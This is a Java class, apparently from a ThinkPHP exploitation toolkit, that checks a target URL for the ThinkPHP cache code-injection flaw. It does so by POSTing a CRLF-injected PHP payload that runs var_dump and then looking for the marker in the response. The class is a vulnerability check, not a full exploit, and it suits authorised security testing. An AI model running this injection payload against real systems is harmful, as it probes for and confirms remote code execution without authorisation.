package com.leishianquan.thinkphpexp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_cache implements BasePayload {
    private static final String CheckStr="11111";

    public boolean checkVUL(String url) throws Exception{

        try {
            String test_result = HttpTool.postHttpRequest(url + "/index.php/Home/Index/index.html", "utf-8","application/x-www-form-urlencoded","a3=%0d%0avar_dump("+CheckStr+");%0d%0a//");

            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}
